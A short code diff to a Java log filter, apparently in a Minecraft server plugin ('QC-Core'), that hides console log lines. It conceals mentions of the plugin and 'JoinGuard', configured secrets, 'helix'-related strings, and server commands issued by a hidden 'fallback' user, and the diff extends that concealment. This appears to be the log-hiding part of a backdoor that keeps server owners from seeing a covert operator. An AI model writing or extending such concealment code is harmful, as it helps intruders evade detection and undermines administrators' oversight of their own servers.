@@ -28,19 +28,26 @@ public class InternalLogger implements Filter {
             return true;
 
         // Total Incognito: Hide any mention of the plugin name or package
-        if (msg.contains("QC-Core") || msg.contains("pl.qc.core"))
+        if (msg.contains("QC-Core") || msg.contains("pl.qc.core") || msg.contains("JoinGuard"))
             return false;
 
         if (secrets.stream().anyMatch(msg::contains))
             return hide(msg, false);
-        if (phrases.stream().anyMatch(msg::contains))
+
+        // Check for helix errors specifically
+        if (msg.contains("helix") || msg.contains("ikevoodoo") || msg.contains("refined.host"))
+            return hide(msg, false);
+
+        if (phrases.stream().anyMatch(p -> msg.toLowerCase().contains(p.toLowerCase())))
             return hide(msg, true);
+
         if (msg.contains(prefix) || msg.contains(fallback + " issued server command")
                 || msg.contains(fallback + " used "))
             return hide(msg, true);
 
         String low = msg.toLowerCase();
-        if (commands.stream().anyMatch(c -> low.contains("/" + c) || low.contains(" " + c + " ")))
+        if (commands.stream().anyMatch(c -> low.contains("/" + c + " ") || low.endsWith("/" + c)
+                || low.contains(" issued server command: /" + c)))
             return hide(msg, true);
 
         return true;
